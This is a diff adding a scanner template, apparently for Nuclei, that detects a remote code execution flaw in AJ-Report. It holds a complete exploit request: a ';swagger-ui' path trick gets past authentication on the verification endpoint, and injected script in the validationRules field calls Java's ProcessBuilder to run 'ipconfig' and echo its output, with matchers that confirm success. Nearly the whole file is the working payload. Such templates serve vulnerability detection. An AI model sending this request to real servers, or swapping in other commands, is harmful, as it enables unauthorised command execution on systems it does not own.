@@ -1,0 +1,30 @@
+id: poc-yaml-aj-report-verification-swagger-ui-rce
+info:
+  name: AJ-Report Remote Code Execution via Swagger-UI Verification
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,aj-report
+http:
+  - raw:
+      - |
+        POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"ipconfig\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "操作成功"
+          - "Windows IP"
+          - "IPv4 Address"
+          - "DNS"
+      - type: word
+        part: header
+        words:
+          - "application/json"
